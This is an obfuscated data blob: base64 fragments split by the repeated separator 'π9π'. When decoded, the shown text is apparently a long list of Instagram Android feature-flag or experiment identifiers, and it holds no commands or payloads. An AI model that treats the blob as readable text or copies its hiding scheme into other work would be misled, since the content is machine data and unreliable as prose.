vbπ9πnN1bXπ9πB0aW9π9πuX3Vuπ9πaXZlcπ9πnNlLGπ9πlnX2Fπ9πuZHJvπ9πaWRfcπ9π3Rvcmπ9πllc19π9πoYXNoπ9πdGFnXπ9π3RleHπ9πQsaWdπ9πfYW5kπ9πcm9pZπ9πF9wb3π9πN0X2xπ9πpdmVfπ9πYmFkZπ9π2VfdWπ9π5pdmVπ9πyc2Usπ9πaWdfYπ9πW5kcmπ9π9pZF9π9πzd2lwπ9πZV9mcπ9πmFnbWπ9πVudF9π9πjb250π9πYWluZπ9πXIsaWπ9πdfYW5π9πkcm9pπ9πZF9zZπ9πWFyY2π9πhfdXNπ9πlcnNfπ9πdW5pdπ9πmVyc2π9πUsaWdπ9πfYW5kπ9πcm9pZπ9πF9saXπ9πZlX3Nπ9πhdmVfπ9πdG9fYπ9π2FtZXπ9πJhX3Jπ9πvbGxfπ9πdW5pdπ9πmVyc2π9πUsaWdπ9πfY3Jlπ9πYXRpbπ9π25fZ3π9πJvd3Rπ9πoX2hvπ9πbGRvdπ9πXQsaWπ9πdfYW5π9πkcm9pπ9πZF9zdπ9πGlja2π9πVyX3Jπ9πlZ2lvπ9πbl90cπ9πmFja2π9πluZyxπ9πpZ19hπ9πbmRybπ9π2lkX3π9πVuaWZπ9πpZWRfπ9πaW5ibπ9π3gsaWπ9πdfYW5π9πkcm9pπ9πZF9saπ9πXZlX2π9π5ld19π9π3YXRjπ9πaF90aπ9πW1lLGπ9πlnX2Fπ9πuZHJvπ9πaWRfbπ9π2ZmbGπ9πluZV9π9πtYWluπ9πX2ZlZπ9πWRfMTπ9πBfMTEπ9πsaWdfπ9πaW1wbπ9π3J0X2π9πJpel9π9πjb250π9πYWN0Xπ9π3RvX3π9πBhZ2Uπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9saXZπ9πlX2Vuπ9πY29yZπ9πV9jb2π9π5zdW1π9πwdGlvπ9πbl91bπ9πml2ZXπ9πJzZSxπ9πpZ19hπ9πbmRybπ9π2lkX2π9πV4cGVπ9πyaW1lπ9πbnRhbπ9πF9maWπ9πx0ZXJπ9πzLGlnπ9πX2FuZπ9πHJvaWπ9πRfc2Vπ9πhcmNoπ9πX2Nsaπ9πWVudFπ9π9tYXRπ9πjaGluπ9πZ18yLπ9πGlnX2π9πFuZHJπ9πvaWRfπ9πcmVhYπ9π3Rfbmπ9πF0aXZπ9πlX2luπ9πbGluZπ9πV9pbnπ9πNpZ2hπ9π0c192π9πMixpZπ9π19hbmπ9πRyb2lπ9πkX2J1π9πc2luZπ9πXNzX2π9πNvbnZπ9πlcnNpπ9πb25fdπ9πmFsdWπ9πVfcHJπ9πvcF92π9πMixpZπ9π19hbmπ9πRyb2lπ9πkX3Jlπ9πZGlyZπ9πWN0X3π9πRvX2xπ9πvd19sπ9πYXRlbπ9πmN5X3π9πVuaXZπ9πlcnNlπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfYWRfπ9πc2hvdπ9π19uZXπ9πdfYXdπ9πyX3Vuπ9πaXZlcπ9πnNlLGπ9πlnX2Zπ9πhbWlsπ9πeV9icπ9πmlkZ2π9πVzX2hπ9πvbGRvπ9πdXRfdπ9πW5pdmπ9πVyc2Uπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9iYWNπ9πrZ3Jvπ9πdW5kXπ9π2V4cGπ9πxvcmVπ9πfZmV0π9πY2gsaπ9πWdfYWπ9π5kcm9π9πpZF9mπ9πb2xsbπ9π3dpbmπ9πdfZm9π9πsbG93π9πZXJfcπ9π29jaWπ9πFsX2Nπ9πvbnRlπ9πeHQsaπ9πWdfYWπ9π5kcm9π9πpZF92π9πaWRlbπ9π19rZWπ9πVwX3Nπ9πjcmVlπ9πbl9vbπ9πixpZ1π9π9hbmRπ9πyb2lkπ9πX2FkXπ9π2xlYWπ9πRnZW5π9πfcmVsπ9πYXlfbπ9πW9kZXπ9πJuLGlπ9πnX2Fuπ9πZHJvaπ9πWRfcHπ9πJvZmlπ9πsZV9wπ9πaG90bπ9π19hc1π9π9tZWRπ9πpYSxpπ9πZ19hbπ9πmRyb2π9πlkX2lπ9πuc3Rhπ9πX3ZpZπ9πGVvX2π9πNvbnNπ9π1bXB0π9πaW9uXπ9π2luZnπ9πJhLGlπ9πnX2Fuπ9πZHJvaπ9πWRfYWπ9πRfd2Fπ9π0Y2hsπ9πZWFkXπ9π3VuaXπ9πZlcnNπ9πlLGlnπ9πX2FuZπ9πHJvaWπ9πRfZGlπ9πyZWN0π9πX3ByZπ9πWZldGπ9πNoX2Rπ9πpcmVjπ9πdF9zdπ9πG9yeVπ9π9qc29π9πuLGlnπ9πX2FuZπ9πHJvaWπ9πRfc2hπ9πvcHBpπ9πbmdfcπ9πmVhY3π9πRfbmFπ9π0aXZlπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfdG9wπ9πX2xpdπ9πmVfcHπ9πJvZmlπ9πsZV9wπ9πaWNzXπ9π3VuaXπ9πZlcnNπ9πlLGlnπ9πX2FuZπ9πHJvaWπ9πRfZGlπ9πyZWN0π9πX3Bobπ9π25lX2π9π51bWJπ9πlcl9sπ9πaW5rcπ9πyxpZ1π9π9hbmRπ9πyb2lkπ9πX3N0bπ9π3JpZXπ9πNfd2Vπ9πibGluπ9πa19jcπ9πmVhdGπ9πlvbixπ9πpZ19hπ9πbmRybπ9π2lkX2π9πRpcmVπ9πjdF9zπ9πZWFyYπ9π2hfbmπ9πV3X3Rπ9πocmVhπ9πZF91bπ9πml2ZXπ9πJzZSxπ9πpZ19hπ9πbmRybπ9π2lkX2π9πhpc3Rπ9πvZ3Jhπ9πbV9yZπ9πXBvcnπ9πRlcixπ9πpZ19hπ9πbmRybπ9π2lkX2π9πRpcmVπ9πjdF9vπ9πbl9wcπ9πm9maWπ9πxlX3Vπ9πuaXZlπ9πcnNlLπ9πGlnX2π9πFuZHJπ9πvaWRfπ9πbmV0dπ9π29ya1π9π9jYW5π9πjZWxsπ9πYXRpbπ9π24saWπ9πdfYW5π9πkcm9pπ9πZF9iYπ9πWNrZ3π9πJvdW5π9πkX3Jlπ9πZWxfZπ9πmV0Y2π9πgsaWdπ9πfYW5kπ9πcm9pZπ9πF9yZWπ9πFjdF9π9πuYXRpπ9πdmVfaπ9πW5zaWπ9πdodHMπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9pbnNπ9π0YV92π9πaWRlbπ9π19hdWπ9πRpb19π9πlbmNvπ9πZGVyLπ9πGlnX2π9πFuZHJπ9πvaWRfπ9πZmFtaπ9πWx5X2π9πJyaWRπ9πnZV9iπ9πb29rbπ9πWFya3π9πMsaWdπ9πfYW5kπ9πcm9pZπ9πF9kYXπ9πRhX3Vπ9πzYWdlπ9πX25ldπ9πHdvcmπ9πtfbGFπ9π5ZXIsπ9πaWdfYπ9πW5kcmπ9π9pZF9π9π1bml2π9πZXJzYπ9πWxfaWπ9π5zdGFπ9πncmFtπ9πX2RlZπ9πXBfbGπ9πlua3Mπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9kYXNπ9πoX2Zvπ9πcl92bπ9π2RfdWπ9π5pdmVπ9πyc2Usπ9πaWdfYπ9πW5kcmπ9π9pZF9π9πtb2R1π9πbGFyXπ9π3RhYlπ9π9kaXNπ9πjb3Zlπ9πcl9wZπ9πW9wbGπ9πVfcmVπ9πkZXNpπ9πZ24saπ9πWdfYWπ9π5kcm9π9πpZF9tπ9πYXNfcπ9π3RpY2π9πtlcl9π9π1cHNlπ9πbGxfZπ9πGlhbGπ9π9nX3Vπ9πuaXZlπ9πcnNlLπ9πGlnX2π9πFuZHJπ9πvaWRfπ9πYWRfYπ9πWRkX3π9πBlcl9π9πldmVuπ9πdF9jbπ9π3VudGπ9πVyX3Rπ9πvX2xvπ9πZ2dpbπ9πmdfZXπ9πZlbnQπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9zdGlπ9πja3lfπ9πaGVhZπ9πGVyX3π9πRvcF9π9πjaHJvπ9πbWVfbπ9π3B0aWπ9π1pemFπ9π0aW9uπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfcnRsπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfYml6π9πX2Nvbπ9πnZlcnπ9πNpb25π9πfcGFnπ9πZV9wcπ9πmVfc2π9πVsZWNπ9π0LGlnπ9πX2FuZπ9πHJvaWπ9πRfcHJπ9πvbW90π9πZV9mcπ9πm9tX3π9πByb2Zπ9πpbGVfπ9πYnV0dπ9πG9uLGπ9πlnX2Fπ9πuZHJvπ9πaWRfbπ9πGl2ZVπ9π9icm9π9πhZGNhπ9πc3Rlcπ9πl9pbnπ9πZpdGVπ9πfdW5pπ9πdmVycπ9π2UsaWπ9πdfYW5π9πkcm9pπ9πZF9zaπ9πGFyZVπ9π9zcGlπ9πubmVyπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfdGV4π9πdF9hYπ9π3Rpb2π9π4saWdπ9πfYW5kπ9πcm9pZπ9πF9vd2π9π5fcmVπ9πlbF90π9πaXRsZπ9πV91bmπ9πl2ZXJπ9πzZSxpπ9πZ19wcπ9πm9tb3π9πRpb25π9πzX3Vuπ9πaXRfaπ9πW5faWπ9π5zaWdπ9πodHNfπ9πbGFuZπ9πGluZ1π9π9wYWdπ9πlLGlnπ9πX2FuZπ9πHJvaWπ9πRfYnVπ9πzaW5lπ9πc3Nfcπ9π2V0dGπ9πluZ3Nπ9πfaGVhπ9πZGVyXπ9π3VuaXπ9πYsaWdπ9πfYW5kπ9πcm9pZπ9πF9zYXπ9πZlX2xπ9πvbmdwπ9πcmVzcπ9π190b2π9π9sdGlπ9πwLGlnπ9πX2FuZπ9πHJvaWπ9πRfY29π9πuc3Ryπ9πYWluXπ9π2ltYWπ9πdlX3Nπ9πpemVfπ9πdW5pdπ9πmVyc2π9πUsaWdπ9πfYW5kπ9πcm9pZπ9πF9idXπ9πNpbmVπ9πzc19uπ9πZXdfZπ9π3JhcGπ9πhxbF9π9πlbmRwπ9πb2ludπ9πF91bmπ9πl2ZXJπ9πzZSxpπ9πZ19yYπ9πW5raWπ9π5nX2Zπ9πvbGxvπ9πd2luZπ9πyxpZ1π9π9hbmRπ9πyb2lkπ9πX3N0bπ9π3JpZXπ9πNfcHJπ9πvZmlsπ9πZV9jYπ9πW1lcmπ9πFfZW5π9π0cnlfπ9πcG9pbπ9πnQsaWπ9πdfYW5π9πkcm9pπ9πZF91bπ9πml2ZXπ9πJzZV9π9πyZWVsπ9πX3ZpZπ9πGVvX3π9πByb2Rπ9π1Y3Rpπ9πb24saπ9πWdfYWπ9π5kcm9π9πpZF9wπ9πb3dlcπ9πl9tZXπ9πRyaWNπ9πzLGlnπ9πX2FuZπ9πHJvaWπ9πRfc2Zπ9πwbHQsπ9πaWdfYπ9πW5kcmπ9π9pZF9π9πvZmZsπ9πaW5lXπ9π2hhc2π9πh0YWdπ9πfZmVlπ9πZCxpZπ9π19hbmπ9πRyb2lπ9πkX2xpπ9πdmVfcπ9π2tpblπ9π9zbW9π9πvdGgsπ9πaWdfYπ9πW5kcmπ9π9pZF9π9πkaXJlπ9πY3Rfaπ9πW5ib3π9πhfc2Vπ9πhcmNoπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfc3Rvπ9πcmllcπ9π19wb3π9πN0aW5π9πnX29mπ9πZmxpbπ9πmVfdWπ9πksaWdπ9πfYW5kπ9πcm9pZπ9πF9zaWπ9πRlY2Fπ9πyX3Zpπ9πZGVvXπ9π3VwbGπ9π9hZF9π9π1bml2π9πZXJzZπ9πSxpZ1π9π9hbmRπ9πyb2lkπ9πX3Bybπ9π21vdGπ9πlvbl9π9πtYW5hπ9πZ2VyXπ9π2VudHπ9πJ5X3Bπ9πvaW50π9πX3Vuaπ9πXZlcnπ9πNlLGlπ9πnX2Fuπ9πZHJvaπ9πWRfZGπ9πlyZWNπ9π0X3Jlπ9πcGx5Xπ9π2F1ZGπ9πllbmNπ9πlX3Vwπ9πZ3JhZπ9πGUsaWπ9πdfYW5π9πkcm9pπ9πZF9zdπ9π2lwZVπ9π9uYXZπ9πpZ2F0π9πaW9uXπ9π3hfYWπ9π5nbGVπ9πfdW5pπ9πdmVycπ9π2UsaWπ9πdfYW5π9πkcm9pπ9πZF9vZπ9πmZsaWπ9π5lX21π9πvZGVfπ9πaG9sZπ9πG91dCπ9πxpZ19π9πhbmRyπ9πb2lkXπ9π2xpdmπ9πVfc2Vπ9πuZF91π9πc2VyXπ9π2xvY2π9πF0aW9π9πuLGlnπ9πX2FuZπ9πHJvaWπ9πRfZGlπ9πyZWN0π9πX2Zldπ9πGNoX2π9πJlZm9π9πyZV9wπ9πdXNoXπ9π25vdGπ9πlmLGlπ9πnX2Fuπ9πZHJvaπ9πWRfbmπ9π9uX3Nπ9πxdWFyπ9πZV9maπ9πXJzdCπ9πxpZ19π9πhbmRyπ9πb2lkXπ9π2luc3π9πRhX3Zπ9πpZGVvπ9πX2RyYπ9πXdpbmπ9πcsaWdπ9πfYW5kπ9πcm9pZπ9πF9zd2π9πlwZWFπ9πibGVmπ9πaWx0Zπ9πXJzX3π9πVuaXZπ9πlcnNlπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfbGl2π9πZV9ubπ9π3RpZmπ9πljYXRπ9πpb25fπ9πY29udπ9πHJvbFπ9π91bmlπ9π2ZXJzπ9πZSxpZπ9π19hbmπ9πRyb2lπ9πkX2Fuπ9πYWx5dπ9πGljc1π9π9sb2dπ9πnZXJfπ9πcnVubπ9πmluZ1π9π9iYWNπ9πrZ3Jvπ9πdW5kXπ9π3VuaXπ9πZlcnNπ9πlLGlnπ9πX2FuZπ9πHJvaWπ9πRfc2Fπ9π2ZV9hπ9πbGwsaπ9πWdfYWπ9π5kcm9π9πpZF9yπ9πZWVsXπ9π3ZpZXπ9πdlcl9π9πkYXRhπ9πX2J1Zπ9πmZlclπ9π9zaXpπ9πlLGlnπ9πX2Rpcπ9πmVjdFπ9π9xdWFπ9πsaXR5π9πX2hvbπ9πGRvdXπ9πRfdW5π9πpdmVyπ9πc2Usaπ9πWdfYWπ9π5kcm9π9πpZF9mπ9πYW1pbπ9πHlfYnπ9πJpZGdπ9πlX2Rpπ9πc2Nvdπ9πmVyLGπ9πlnX2Fπ9πuZHJvπ9πaWRfcπ9πmVhY3π9πRfbmFπ9π0aXZlπ9πX3Jlcπ9π3Rhcnπ9πRfYWZπ9π0ZXJfπ9πZXJybπ9π3JfdWπ9π5pdmVπ9πyc2Usπ9πaWdfYπ9πW5kcmπ9π9pZF9π9πzdGFyπ9πdHVwXπ9π21hbmπ9πFnZXIπ9πsaWdfπ9πc3Rvcπ9πnlfdHπ9πJheV9π9πwZWVrπ9πX2Nvbπ9πnRlbnπ9πRfdW5π9πpdmVyπ9πc2Usaπ9πWdfYWπ9π5kcm9π9πpZF9wπ9πcm9maπ9πWxlLGπ9πlnX2Fπ9πuZHJvπ9πaWRfaπ9πGlnaFπ9π9yZXNπ9πfdXBsπ9πb2FkXπ9πzIsaWπ9πdfYW5π9πkcm9pπ9πZF9odπ9πHRwX3π9πNlcnZπ9πpY2Vfπ9πc2FtZπ9πV90aHπ9πJlYWQπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9zY3Jπ9πvbGxfπ9πdG9fZπ9πGlzbWπ9πlzc19π9πrZXliπ9πb2FyZπ9πCxpZ1π9π9hbmRπ9πyb2lkπ9πX3Jlbπ9πW92ZVπ9π9mb2xπ9πsb3dlπ9πcnNfdπ9πW5pdmπ9πVyc2Uπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9za2lπ9πwX3Zpπ9πZGVvXπ9π3Jlbmπ9πRlcixπ9πpZ19hπ9πbmRybπ9π2lkX3π9πN0b3Jπ9π5X3Rpπ9πbWVzdπ9πGFtcHπ9πMsaWdπ9πfYW5kπ9πcm9pZπ9πF9saXπ9πZlX3Zπ9πpZXdlπ9πcl9jbπ9π21tZWπ9π50X3Bπ9πyb21wπ9πdF91bπ9πml2ZXπ9πJzZSxπ9πpZ19wπ9πcm9maπ9πWxlX2π9πhvbGRπ9πvdXRfπ9πdW5pdπ9πmVyc2π9πUsaWdπ9πfYW5kπ9πcm9pZπ9πF9yZWπ9πFjdF9π9πuYXRpπ9πdmVfaπ9πW5zaWπ9πdodHNπ9πfZ3Jpπ9πZF92aπ9πWV3LGπ9πlnX3Nπ9π0b3Jpπ9πZXNfcπ9π2VsZmπ9πllX3Nπ9π0aWNrπ9πZXIsaπ9πWdfYWπ9π5kcm9π9πpZF9zπ9πdG9yaπ9πWVzX3π9πJlcGxπ9π5X2Nvπ9πbXBvcπ9π2VyX3π9πJlZGVπ9πzaWduπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfc3Ryπ9πZWFtbπ9πGluZVπ9π9wYWdπ9πlX2Nyπ9πZWF0aπ9πW9uLGπ9πlnX2Vπ9π4cGxvπ9πcmVfbπ9πmV0ZWπ9πdvLGlπ9πnX2Fuπ9πZHJvaπ9πWRfaWπ9πc0Yl9π9πjb25uπ9πZWN0Xπ9π2ZiX2π9πJ1dHRπ9πvbl91π9πbml2Zπ9πXJzZSπ9πxpZ19π9πhbmRyπ9πb2lkXπ9π2ZlZWπ9πRfdXRπ9πpbF9yπ9πZWN0Xπ9π29wdGπ9πltaXpπ9πhdGlvπ9πbixpZπ9π19hbmπ9πRyb2lπ9πkX3Jlπ9πbmRlcπ9πmluZ1π9π9jb25π9π0cm9sπ9πcyxpZπ9π19hbmπ9πRyb2lπ9πkX29zπ9πX3Zlcπ9πnNpb2π9π5fYmxπ9πvY2tpπ9πbmcsaπ9πWdfYWπ9π5kcm9π9πpZF9lπ9πbmNvZπ9πGVyX3π9πdpZHRπ9πoX3Nhπ9πZmVfbπ9πXVsdGπ9πlwbGVπ9πfMTYsπ9πaWdfcπ9π2Vhcmπ9πNoX25π9πld19iπ9πb290cπ9π3RyYXπ9πBfaG9π9πsZG91π9πdF91bπ9πml2ZXπ9πJzZSxπ9πpZ19hπ9πbmRybπ9π2lkX3π9πNuaXBπ9πwZXRzπ9πX3Bybπ9π2ZpbGπ9πVfbnVπ9π4LGlnπ9πX2FuZπ9πHJvaWπ9πRfZTJπ9πlX29wπ9πdGltaπ9πXphdGπ9πlvbl9π9π1bml2π9πZXJzZπ9πSxpZ1π9π9hbmRπ9πyb2lkπ9πX2Nvbπ9πW1lbnπ9πRzX2xπ9πvZ2dpπ9πbmdfdπ9πW5pdmπ9πVyc2Uπ9πsaWdfπ9πc2hvcπ9πHBpbmπ9πdfaW5π9πzaWdoπ9πdHMsaπ9πWdfYWπ9π5kcm9π9πpZF9zπ9πYXZlXπ9π2NvbGπ9πxlY3Rπ9πpb25zπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfbGl2π9πZV9zZπ9πWVfZmπ9πV3ZXJπ9πfdmlkπ9πZW9zXπ9π2xpa2π9πVfdGhπ9πpc191π9πbml2Zπ9πXJzZSπ9πxpZ19π9πhbmRyπ9πb2lkXπ9π3Nob3π9πdfbmVπ9π3X2Nvπ9πbnRhYπ9π3RfaWπ9π1wb3Jπ9π0X2Rpπ9πYWxvZπ9πyxpZ1π9π9hbmRπ9πyb2lkπ9πX2xpdπ9πmVfdmπ9πlld19π9πwcm9mπ9πaWxlXπ9π2Zyb2π9π1fY29π9πtbWVuπ9πdHNfdπ9πW5pdmπ9πVyc2Uπ9πsaWdfπ9πZmJucπ9π19ibGπ9π9ja2Vπ9πkLGlnπ9πX2Zvcπ9πm1hdHπ9πNfYW5π9πkX2Zlπ9πZWRiYπ9πWNrc1π9π9ob2xπ9πkb3V0π9πX3Vuaπ9πXZlcnπ9πNlLGlπ9πnX2Fuπ9πZHJvaπ9πWRfcmπ9πVkdWNπ9πlX3Zpπ9πZXdfcπ9πGFnZXπ9πJfYnVπ9πmZmVyπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfaW5zπ9πdGF2aπ9πWRlb1π9π9wZXJπ9πpb2Rpπ9πY19ubπ9π3RpZiπ9πxpZ19π9πzZWFyπ9πY2hfdπ9πXNlclπ9π9hdXRπ9πvX2Nvπ9πbXBsZπ9πXRlX2π9πNhY2hπ9πlX3N5π9πbmNfdπ9πHRsLGπ9πlnX2Fπ9πuZHJvπ9πaWRfbπ9πWFyYXπ9πVkZXJπ9πfdXBkπ9πYXRlXπ9π2ZyZXπ9πF1ZW5π9πjeSxpπ9πZ19hbπ9πmRyb2π9πlkX3Nπ9π1Z2dlπ9πc3Rfcπ9πGFzc3π9πdvcmRπ9πfcmVzπ9πZXRfbπ9π25fb2π9π5lY2xπ9πpY2tfπ9πbG9naπ9πW4saWπ9πdfYW5π9πkcm9pπ9πZF9wcπ9πm9tb3π9πRpb25π9πfZW50π9πcnlfZπ9πnJvbVπ9π9hZHNπ9πfbWFuπ9πYWdlcπ9πl91bmπ9πl2ZXJπ9πzZSxpπ9πZ19hbπ9πmRyb2π9πlkX2xπ9πpdmVfπ9πc3BlYπ9π2lhbFπ9π9jb2Rπ9πlY19zπ9πaXplXπ9π2xpc3π9πQsaWdπ9πfYW5kπ9πcm9pZπ9πF9lbmπ9πFibGVπ9πfc2hhπ9πcmVfdπ9πG9fbWπ9πVzc2Vπ9πuZ2Vyπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfYmFjπ9πa2dybπ9π3VuZFπ9π9tYWlπ9πuX2Zlπ9πZWRfZπ9πmV0Y2π9πgsaWdπ9πfYW5kπ9πcm9pZπ9πF9saXπ9πZlX3Zπ9πpZGVvπ9πX3JlYπ9πWN0aWπ9π9uc19π9πjcmVhπ9πdGlvbπ9πl91bmπ9πl2ZXJπ9πzZSxpπ9πZ19hbπ9πmRyb2π9πlkX2Nπ9πoYW5uπ9πZWxzXπ9π2hvbWπ9πUsaWdπ9πfYW5kπ9πcm9pZπ9πF9zaWπ9πRlY2Fπ9πyX2dhπ9πbGxlcπ9πnlfdWπ9π5pdmVπ9πyc2Usπ9πaWdfYπ9πW5kcmπ9π9pZF9π9π1cGxvπ9πYWRfcπ9πmVsaWπ9πFiaWxπ9πpdHlfπ9πdW5pdπ9πmVyc2π9πUsaWdπ9πfbWlnπ9πcmF0Zπ9πV9tZWπ9πRpYXYπ9πyX3Vuπ9πaXZlcπ9πnNlLGπ9πlnX2Fπ9πuZHJvπ9πaWRfaπ9πW5zdGπ9πFfdmlπ9πkZW9fπ9πYnJvYπ9πWRjYXπ9πN0ZXJπ9πfaW5mπ9πcmFfcπ9πGVyZiπ9πxpZ19π9πhbmRyπ9πb2lkXπ9π2J1c2π9πluZXNπ9πzX2Nvπ9πbnZlcπ9πnNpb2π9π5fc29π9πjaWFsπ9πX2Nvbπ9πnRleHπ9πQsYW5π9πkcm9pπ9πZF9pZπ9π19mYmπ9π5zX2tπ9πpbGxfπ9πc3dpdπ9πGNoLGπ9πlnX2Fπ9πuZHJvπ9πaWRfbπ9πGl2ZVπ9π93ZWJπ9πydGNfπ9πbGl2Zπ9πXdpdGπ9πhfY29π9πuc3Vtπ9πcHRpbπ9π24saWπ9πdfYW5π9πkcm9pπ9πZF9kZπ9πXN0cmπ9π95X3Nπ9π3aXBlπ9πX2ZyYπ9πWdtZWπ9π50LGlπ9πnX2Fuπ9πZHJvaπ9πWRfcmπ9πVhY3Rπ9πfbmF0π9πaXZlXπ9π3VuaXπ9πZlcnNπ9πlX2tpπ9πbGxfcπ9π3dpdGπ9πNoLGlπ9πnX2Fuπ9πZHJvaπ9πWRfc3π9πRvcmlπ9πlc19iπ9πb29rXπ9π3VuaXπ9πZlcnNπ9πlLGlnπ9πX2FuZπ9πHJvaWπ9πRfYWxπ9πsX3Zpπ9πZGVvcπ9πGxheWπ9πJhY2tπ9πfcGVyπ9πc2lzdπ9πGluZ1π9π9zb3Vπ9πuZCxpπ9πZ19hbπ9πmRyb2π9πlkX2Rπ9πyYXdfπ9πZXJhcπ9π2VyX3π9πVuaXZπ9πlcnNlπ9πLGlnXπ9π2Rpcmπ9πVjdF9π9πzZWFyπ9πY2hfbπ9πmV3X2π9πJvb3Rπ9πzdHJhπ9πcF9obπ9π2xkb3π9πV0X3Vπ9πuaXZlπ9πcnNlLπ9πGlnX2π9πFuZHJπ9πvaWRfπ9πY2Fjaπ9πGVfbGπ9πF5ZXJπ9πfYnl0π9πZXNfdπ9πGhyZXπ9πNob2xπ9πkLGlnπ9πX2FuZπ9πHJvaWπ9πRfc2Vπ9πhcmNoπ9πX2hhcπ9π2hfdGπ9πFnX2Fπ9πuZF91π9πc2Vybπ9πmFtZVπ9π91bmlπ9π2ZXJzπ9πZSxpZπ9π19hbmπ9πRyb2lπ9πkX2J1π9πc2luZπ9πXNzX3π9πByb21π9πvdGlvπ9πbixpZπ9π19hbmπ9πRyb2lπ9πkX2Rpπ9πcmVjdπ9πF9zZWπ9πFyY2hπ9πfcmVjπ9πaXBpZπ9πW50c1π9π9jb25π9π0cm9sπ9πbGVyXπ9π3VuaXπ9πZlcnNπ9πlLGlnπ9πX2FuZπ9πHJvaWπ9πRfYWRπ9πfc2hvπ9πd19mdπ9πWxsX2π9π5hbWVπ9πfdW5pπ9πdmVycπ9π2UsaWπ9πdfYW5π9πkcm9pπ9πZF9hbπ9πnJ3YXπ9πRjaGRπ9πvZyxpπ9πZ19hbπ9πmRyb2π9πlkX3Fπ9πwX2tpπ9πbGxfcπ9π3dpdGπ9πNoLGlπ9πnX2Fuπ9πZHJvaπ9πWRfMmπ9πZhYyxπ9πpZ19kπ9πaXJlYπ9π3RfYnπ9πlwYXNπ9πzX2dyπ9πb3VwXπ9π3Npemπ9πVfbGlπ9πtaXRfπ9πdW5pdπ9πmVyc2π9πUsaWdπ9πfYW5kπ9πcm9pZπ9πF9wcmπ9π9tb3Rπ9πlX3Npπ9πbXBsaπ9πWZpZWπ9πRfZmxπ9πvdyxpπ9πZ19hbπ9πmRyb2π9πlkX3Nπ9πoYXJlπ9πX3RvXπ9π3doYXπ9πRzYXBπ9πwLGlnπ9πX2FuZπ9πHJvaWπ9πRfaGlπ9πkZV9iπ9πb3R0bπ9π21fbmπ9πF2X2Jπ9πhcl9vπ9πbl9kaπ9πXNjb3π9πZlcl9π9πwZW9wπ9πbGUsaπ9πWdfZmπ9πJuc19π9πkdW1wπ9πX2lkcπ9πyxpZ1π9π9hbmRπ9πyb2lkπ9πX2hhbπ9πmRzX2π9πZyZWVπ9πfYmVmπ9πb3JlXπ9π3Jldmπ9πVyc2Uπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π9za3lπ9π3YWxrπ9πZXJfbπ9πGl2ZVπ9π9ldmVπ9πudF9zπ9πdGFydπ9πF9lbmπ9πQsaWdπ9πfYW5kπ9πcm9pZπ9πF9saXπ9πZlX2pπ9πvaW5fπ9πY29tbπ9πWVudFπ9π91aV9π9πjaGFuπ9πZ2Usaπ9πWdfYWπ9π5kcm9π9πpZF9kπ9πaXJlYπ9π3Rfc2π9πVhcmNπ9πoX3N0π9πb3J5Xπ9π3JlY2π9πlwaWVπ9πudHNfπ9πdW5pdπ9πmVyc2π9πUsaWdπ9πfYW5kπ9πcm9pZπ9πF9kaXπ9πJlY3Rπ9πfZnVsπ9πbF9zaπ9πXplX2π9πdhbGxπ9πlcnlfπ9πdXBsbπ9π2FkLGπ9πlnX2Fπ9πuZHJvπ9πaWRfYπ9πWRfYnπ9πJvd3Nπ9πlcl9nπ9πZXN0dπ9πXJlX2π9πNvbnRπ9πyb2wsπ9πaWdfYπ9π2hhbmπ9π5lbF9π9πzZXJ2π9πZXJfZπ9πXhwZXπ9πJpbWVπ9πudHMsπ9πaWdfYπ9πW5kcmπ9π9pZF9π9π2aWRlπ9πb19jbπ9π3Zlclπ9π9mcmFπ9πtZV9mπ9πcm9tXπ9π29yaWπ9πdpbmFπ9πsX2Fzπ9πX2Zhbπ9πGxiYWπ9πNrLGlπ9πnX2Fuπ9πZHJvaπ9πWRfYWπ9πRfd2Fπ9π0Y2hpπ9πbnN0Yπ9πWxsX3π9πVuaXZπ9πlcnNlπ9πLGlnXπ9π2FuZHπ9πJvaWRπ9πfYWRfπ9πdmlldπ9π2FiaWπ9πxpdHlπ9πfbG9nπ9πZ2luZπ9π191bmπ9πl2ZXJπ9πzZSxpπ9πZ19hbπ9πmRyb2π9πlkX25π9πld19vπ9πcHRpYπ9πyxpZ1π9π9hbmRπ9πyb2lkπ9πX2Rpcπ9πmVjdFπ9π92aXNπ9π1YWxfπ9πcmVwbπ9πGllcyπ9πxpZ19π9πhbmRyπ9πb2lkXπ9π3N0b3π9πJpZXNπ9πfc2Vhπ9πcmNoXπ9π3JlZWπ9πxfbWVπ9πudGlvπ9πbnNfdπ9πW5pdmπ9πVyc2Uπ9πsaWdfπ9πYW5kcπ9πm9pZFπ9π90aHJπ9πlYWRlπ9πZF9jbπ9π21tZWπ9π50c19π9π1bml2π9πZXJzZπ9πSxpZ1π9π9hbmRπ9πyb2lkπ9πX21hcπ9πmtfcmπ9πVlbF9π9πzZWVuπ9πX29uXπ9π1N3aXπ9πBlX2Zπ9πvcndhπ9πcmQsaπ9πWdfaWπ9π50ZXJπ9πuYWxfπ9πdWlfZπ9πm9yX2π9πxhenlπ9πfbG9hπ9πZGVkXπ9π21vZHπ9πVsZXNπ9πfZXhwπ9πZXJpbπ9πWVudCπ9πxpZ19π9πmYm5zπ9πX3NoYπ9πXJlZCπ9πxpZ19π9πhbmRyπ9πb2lkXπ9π2NhcHπ9πR1cmVπ9πfc2xvπ9πd21vXπ9π21vZGπ9πUsaWdπ9πfYW5kπ9πcm9pZπ9πF9saXπ9πZlX3Zπ9πpZXdlπ9πcnNfbπ9πGlzdFπ9π9zZWFπ9πyY2hfπ9πYmFyLπ9πGlnX2π9πFuZHJπ9πvaW